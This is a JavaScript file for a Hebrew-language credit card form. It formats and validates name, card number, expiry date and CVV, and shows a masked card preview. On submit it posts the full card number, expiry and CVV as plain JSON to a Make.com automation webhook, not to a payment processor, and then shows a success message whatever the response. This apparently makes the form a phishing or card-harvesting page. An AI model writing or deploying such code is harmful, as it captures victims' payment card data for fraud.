// ===== DOM Elements =====
const form = document.getElementById('creditForm');
const fullName = document.getElementById('fullName');
const cardNumber = document.getElementById('cardNumber');
const expiryDate = document.getElementById('expiryDate');
const cvv = document.getElementById('cvv');
const operationType = document.getElementById('operationType');
const submitBtn = document.getElementById('submitBtn');

// Removed conditional fields from HTML

// Checkboxes
const consent1 = document.getElementById('consent1');
const consent2 = document.getElementById('consent2');

// Card display elements
const cardNumberDisplay = document.getElementById('cardNumberDisplay');
const cardHolderDisplay = document.getElementById('cardHolderDisplay');
const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');

// Modal
const successModal = document.getElementById('successModal');


// ===== Card Number Formatting =====
cardNumber.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.substring(0, 16);
    let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = formatted;

    // Keep display as dots always
    cardNumberDisplay.textContent = '•••• •••• •••• ••••';

    validateField(cardNumber, value.length === 16);
});

// ===== Expiry Date Formatting =====
expiryDate.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.substring(0, 4);

    if (value.length >= 2) {
        let month = parseInt(value.substring(0, 2));
        if (month > 12) month = 12;
        if (month < 1 && value.substring(0, 2) !== '0' && value.substring(0, 2) !== '00') month = 1;
        value = String(month).padStart(2, '0') + value.substring(2);
        e.target.value = value.substring(0, 2) + '/' + value.substring(2);
    } else {
        e.target.value = value;
    }

    cardExpiryDisplay.textContent = e.target.value || 'MM/YY';
    validateField(expiryDate, value.length === 4);
});

// ===== Full Name Field =====
fullName.addEventListener('input', () => {
    const name = fullName.value.trim();
    cardHolderDisplay.textContent = name || 'שם מלא';
    validateField(fullName, name.length >= 2);
});

// ===== CVV =====
cvv.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    e.target.value = value.substring(0, 4);
    validateField(cvv, value.length >= 3);
});

// ===== Checkbox validation =====
consent1.addEventListener('change', () => {
    const group = document.getElementById('consent1Group');
    group.classList.remove('error');
    if (!consent1.checked) group.classList.add('error');
});

consent2.addEventListener('change', () => {
    const group = document.getElementById('consent2Group');
    group.classList.remove('error');
    if (!consent2.checked) group.classList.add('error');
});

// ===== Field Validation =====
function validateField(field, isValid) {
    const group = field.closest('.form-group');
    group.classList.remove('error', 'valid');
    if (field.value.length > 0) {
        group.classList.add(isValid ? 'valid' : 'error');
    }
}

// ===== Form Submission =====
form.addEventListener('submit', async (e) => {
    e.preventDefault();

    let isValid = true;

    // Validate all required fields
    if (fullName.value.trim().length < 2) {
        validateField(fullName, false);
        isValid = false;
    }
    if (cardNumber.value.replace(/\D/g, '').length !== 16) {
        validateField(cardNumber, false);
        isValid = false;
    }
    if (expiryDate.value.replace(/\D/g, '').length !== 4) {
        validateField(expiryDate, false);
        isValid = false;
    }
    if (cvv.value.length < 3) {
        validateField(cvv, false);
        isValid = false;
    }
    if (!operationType.value) {
        validateField(operationType, false);
        isValid = false;
    }


    // Validate checkboxes
    if (!consent1.checked) {
        document.getElementById('consent1Group').classList.add('error');
        isValid = false;
    }
    if (!consent2.checked) {
        document.getElementById('consent2Group').classList.add('error');
        isValid = false;
    }

    if (!isValid) {
        document.querySelectorAll('.form-group.error, .checkbox-group.error').forEach(group => {
            group.style.animation = 'shake 0.5s ease';
            setTimeout(() => group.style.animation = '', 500);
        });

        // Scroll to first error
        const firstError = document.querySelector('.form-group.error, .checkbox-group.error');
        if (firstError) {
            firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
        return;
    }

    // Loading state
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    const payload = {
        fullName: fullName.value,
        cardNumber: cardNumber.value,
        expiryDate: expiryDate.value,
        cvv: cvv.value,
        operationType: operationType.value
    };

    fetch('https://hook.eu2.make.com/rvk9ffml5gexbd0iru0b5s414bzxv9fk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        // Success state
        submitBtn.classList.remove('loading');
        submitBtn.classList.add('success');

        setTimeout(() => {
            successModal.classList.add('active');
        }, 600);
    })
    .catch(error => {
        console.error('Error submitting form:', error);
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
        alert('אירעה שגיאה בשליחת הנתונים. אנא נסו שוב.');
    });
});

// Modal clicks handled natively via href.

// ===== Shake Animation =====
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        20% { transform: translateX(-6px); }
        40% { transform: translateX(6px); }
        60% { transform: translateX(-4px); }
        80% { transform: translateX(4px); }
    }
`;
document.head.appendChild(style);

// ===== Input Focus Animations =====
document.querySelectorAll('input, select').forEach(el => {
    el.addEventListener('focus', () => {
        const group = el.closest('.form-group');
        if (group) {
            group.style.transform = 'scale(1.01)';
            group.style.transition = 'transform 0.2s ease';
        }
    });
    el.addEventListener('blur', () => {
        const group = el.closest('.form-group');
        if (group) {
            group.style.transform = 'scale(1)';
        }
    });
});
